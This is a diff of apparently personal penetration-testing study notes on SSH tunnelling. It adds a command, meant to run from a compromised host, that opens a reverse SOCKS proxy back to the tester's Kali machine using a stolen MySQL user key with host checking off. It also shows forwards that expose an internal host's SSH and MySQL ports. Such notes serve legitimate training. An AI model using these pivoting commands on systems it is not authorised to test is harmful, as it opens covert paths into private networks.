@@ -50,17 +50,23 @@ ssh -f -N -R 1122:10.5.5.11:22 -R 13306:10.5.5.11:3306 -o "UserKnownHostsFile=/d
 
 ## SSH Dynamic Port Forwarding
 - With the **-D** flag we can set a SOCKS4/5 application proxy
-```
-kali@kali:~$ sudo ssh -N -D 127.0.0.1:8080 user1@10.11.0.128
+  ```
+  kali@kali:~$ sudo ssh -N -D 127.0.0.1:8080 user1@10.11.0.128
 
-kali@kali:~$ cat /etc/proxychains.conf
-...
-[ProxyList]
-# add proxy here ...
-# meanwile
-# defaults set to "tor"
-socks5 127.0.0.1 8080
-```
+  kali@kali:~$ cat /etc/proxychains.conf
+  ...
+  [ProxyList]
+  # add proxy here ...
+  # meanwile
+  # defaults set to "tor"
+  socks5 127.0.0.1 8080
+  ```
+
+- With the **-R** option, by not including a host after the port, ssh is instructed to create a SOCKS proxy on our Kali Server
+  ```bash
+  ssh -f -N -R 1080 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /var/lib/mysql/.ssh/id_rsa kali@10.11.0.4
+  ```
+  
 
 ## NETSH Port Forwarding
 - Installed by default on every modern version of Windows
